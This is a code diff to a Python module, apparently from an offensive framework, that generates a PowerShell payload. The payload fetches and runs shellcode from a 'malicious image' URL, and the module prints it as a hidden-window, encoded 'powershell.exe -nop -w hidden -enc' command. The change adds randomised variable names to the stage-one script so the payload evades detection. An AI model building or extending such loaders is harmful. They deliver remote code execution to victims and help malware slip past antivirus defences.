@@ -4,6 +4,8 @@ import os
 import time
 import gzip
 import tempfile
+import random
+import string
 
 class PsModule(ModuleObject):
     
@@ -12,11 +14,19 @@ class PsModule(ModuleObject):
         self.ui = ui
         self.vars = {}
         self.vars["url"] = ["", "Url that point to the malicious image"]
+        self.vars["rand"] = ["true", "Use random variables name"]
         self.description = "Module to generate Powershell payload"
         self.module_name = "powershell"
         
     def run_action(self):
-        stage1 = self.load_file("core/util/exec-sc.ps1").replace("[URL]", self.vars["url"][0])
+        stage1 = ""
+        if self.vars["rand"][0].lower() == "true":
+            stage1 = self.load_file("core/util/exec-sc-rand.ps1").replace("[URL]", self.vars["url"][0])
+            for i in reversed(range(1, 12)):
+                stage1 = stage1.replace("var" + str(i), self.gen_str(random.randrange(5, 25)))
+        else:
+            stage1 = self.load_file("core/util/exec-sc.ps1").replace("[URL]", self.vars["url"][0])
+			
         path = self.write_file(stage1)
         stage1 = self.read_file(path).replace("A", "!")
         self.delete_file(path)
@@ -24,6 +34,9 @@ class PsModule(ModuleObject):
         self.ui.print_msg("Powershell script:")
         print "powershell.exe -nop -w hidden -enc %s" % self.convert_to_unicode(stage2)
         
+    def gen_str(self, size):
+        return ''.join(random.SystemRandom().choice(string.ascii_uppercase + string.ascii_lowercase) for _ in range(size)) 
+		
     def load_file(self, path):
         path = os.getcwd() + "/" + path
         if os.path.exists(path):
